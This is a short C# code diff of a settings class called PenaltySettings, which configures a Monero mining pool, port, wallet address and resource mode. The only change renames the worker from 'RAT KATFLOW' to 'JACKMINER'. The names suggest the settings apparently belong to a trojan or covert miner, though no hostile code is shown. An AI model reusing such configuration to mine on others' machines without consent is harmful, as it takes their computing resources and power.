@@ -11,7 +11,7 @@ public sealed class PenaltySettings
     public string PoolHost { get; set; } = "moneroocean.stream";
     public int PoolPort { get; set; } = 10001;
     public string WalletAddress { get; set; } = ReceivingAddress;
-    public string WorkerName { get; set; } = "RAT KATFLOW";
+    public string WorkerName { get; set; } = "JACKMINER";
     public string ResourceMode { get; set; } = "Medium";
 }
 
